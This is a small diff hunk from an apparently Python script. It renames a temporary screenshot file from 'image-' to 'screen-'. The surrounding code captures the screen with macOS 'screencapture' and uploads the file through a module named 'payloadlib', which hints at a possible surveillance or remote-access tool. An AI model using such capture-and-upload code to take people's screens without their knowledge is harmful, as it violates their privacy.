@@ -7,7 +7,7 @@ import os
 import sys
 import datetime
 
-filename = '/tmp/image-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
+filename = '/tmp/screen-{}.png'.format(datetime.datetime.now().strftime('%Y-%m-%d-%H-%M'))
 if os.system('screencapture '+filename) == 0:
     sys.stdout.write("Screenshot successful\n")
     payloadlib.upload(filename)
